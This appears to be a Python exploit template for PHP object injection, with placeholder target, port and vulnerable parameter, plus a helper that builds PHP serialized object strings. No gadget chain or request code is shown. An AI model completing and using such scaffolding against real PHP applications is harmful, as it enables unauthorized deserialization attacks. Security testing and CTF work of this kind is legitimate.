import urllib.parse
import urllib.request

BASE = "http://TARGET:PORT"   # TODO
PARAM = "data"                # TODO: param feeding {{SINK}}


def php_serialize_object(cls: str, props: dict) -> str:
    # Minimal PHP object serializer. props: {name: (php_type, value)}
    # php_type in {"s","i","b"}; extend as needed.
    parts = []
    for name, (t, val) in props.items():
        nk = f's:{len(name)}:"{name}";'
        if t == "s":
            vv = f's:{len(str(val))}:"{val}";'
        elif t == "i":
            vv = f"i:{int(val)};"
        elif t == "b":
            vv = f"b:{1 if val else 0};"
        else:
            raise ValueError(t)
        parts.append(nk + vv)
    body = "".join(parts)
    return f'O:{len(cls)}:"{cls}":{len(props)}:{{{body}}}'


